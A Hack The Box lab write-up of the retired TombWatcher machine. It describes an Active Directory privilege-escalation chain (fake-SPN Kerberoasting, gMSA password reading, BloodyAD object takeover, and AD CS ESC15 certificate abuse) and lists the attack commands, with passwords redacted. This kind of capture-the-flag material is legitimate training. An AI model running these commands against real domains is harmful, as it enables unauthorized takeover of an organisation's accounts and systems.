---
title: HTB TombWatcher
slug: tombwatcher
lang: en
platform: Hack The Box
category: Active Directory
headline: Fake SPN Kerberoasting, gMSA password recovery, object takeover and AD CS ESC15
difficulty: Retired
objective: Root / Administrator
date: 2025-06-10
tags: [Active Directory, Kerberoasting, gMSA, BloodyAD, ESC15]
---

# HTB TombWatcher

## Executive Summary

TombWatcher begins with a valid low-privileged domain account. That account can modify another user enough to add a fake SPN, enabling Kerberoasting and the recovery of stronger credentials.

## Domain Progression

The cracked `alfred` credential can join the `Infrastructure` group. That group can read the managed password for the `ansible_dev$` gMSA, which provides the rights needed to reset another account and continue the chain.

## Object Takeover

With `sam`, BloodyAD is used to take ownership of `john`, grant GenericAll and reset the password. The `john` account has remote management access, enabling an interactive WinRM session.

## AD CS Escalation

BloodHound analysis points to control over the ADCS OU and a deleted `cert_admin` object. Restoring and enabling that account allows certificate abuse through ESC15, requesting a certificate on behalf of Administrator and authenticating as domain admin.

## Key Commands

```bash
GetUserSPNs.py tombwatcher.htb/henry:<redacted-password> -dc-ip 10.129.242.169 -request
```

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p <redacted-password> set owner john sam
```

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p <redacted-password> add genericAll john sam
```

```bash
Restore-ADObject -Identity <deleted-object-guid>
```

```bash
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<redacted>" -Force)
```

```bash
certipy req -u cert_admin@tombwatcher.htb -p <redacted-password> -on-behalf-of TOMBWATCHER\Administrator -template User -ca tombwatcher-CA-1 -pfx cert_admin.pfx -dc-ip 10.129.91.64
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20250610075638.png|tombwatcher evidence 01]]

![[Pasted image 20250610080043.png|tombwatcher evidence 02]]

![[Pasted image 20250610083711.png|tombwatcher evidence 03]]

![[Pasted image 20250610083640.png|tombwatcher evidence 04]]

![[Pasted image 20250610110209.png|tombwatcher evidence 05]]

![[Pasted image 20250610110341.png|tombwatcher evidence 06]]

![[Pasted image 20250610082159.png|tombwatcher evidence 07]]

![[Pasted image 20250610082355.png|tombwatcher evidence 08]]

![[Pasted image 20250610082827.png|tombwatcher evidence 09]]

![[Pasted image 20250610213048.png|tombwatcher evidence 10]]

![[Pasted image 20250610213019.png|tombwatcher evidence 11]]

![[Pasted image 20250610213210.png|tombwatcher evidence 12]]

![[Pasted image 20250610213508.png|tombwatcher evidence 13]]

![[Pasted image 20250610213926.png|tombwatcher evidence 14]]

![[Pasted image 20250610214116.png|tombwatcher evidence 15]]

![[Pasted image 20250610214131.png|tombwatcher evidence 16]]

![[Pasted image 20250610214224.png|tombwatcher evidence 17]]

![[Pasted image 20250610232132.png|tombwatcher evidence 18]]

![[Pasted image 20250610233645.png|tombwatcher evidence 19]]

![[Pasted image 20250610234247.png|tombwatcher evidence 20]]

![[Pasted image 20250610234850.png|tombwatcher evidence 21]]

![[Pasted image 20250610234826.png|tombwatcher evidence 22]]

![[Pasted image 20250611001729.png|tombwatcher evidence 23]]

![[Pasted image 20250611002237.png|tombwatcher evidence 24]]

![[Pasted image 20250611002641.png|tombwatcher evidence 25]]

![[Pasted image 20250611002854.png|tombwatcher evidence 26]]

![[Pasted image 20250611003340.png|tombwatcher evidence 27]]

![[Pasted image 20250611003437.png|tombwatcher evidence 28]]

![[Pasted image 20250610230334.png|tombwatcher evidence 29]]

![[Pasted image 20250611004549.png|tombwatcher evidence 30]]

![[Pasted image 20250611004731.png|tombwatcher evidence 31]]

![[Pasted image 20250610230434.png|tombwatcher evidence 32]]

![[Pasted image 20250610230547.png|tombwatcher evidence 33]]

![[Pasted image 20250610230806.png|tombwatcher evidence 34]]
